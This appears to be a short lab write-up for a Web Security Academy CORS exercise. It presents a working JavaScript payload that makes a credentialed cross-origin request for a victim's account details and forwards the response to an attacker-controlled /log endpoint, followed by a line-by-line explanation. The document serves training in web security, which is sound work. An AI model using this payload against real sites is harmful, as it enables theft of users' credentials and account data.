1. The following script is delivered to the victim:

	```
	<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','https://0a2d009103e823e780db94e900590045.web-security-academy.net/accountDetails',true);
		req.withCredentials = true;
		req.send();

		function reqListener() {
		   location='/log?key='+this.responseText;
		};
	</script>
	```
	**_The script does the following:_**   
		// Create an XMLHttpRequest instance.   
		// Set the event handler that will be called when the response is received.   
		// opening a GET request to the URL to retrieve account details   
		// Sending cookies and HTTP authentication information in the request   
		// Sending the request   
		// Event handler function called when a response is received from the server   
		// forwarding the current page to a log file with the received response text as parameter   
	
2.After supposedly executing the script on victims machine his credentials get logged:
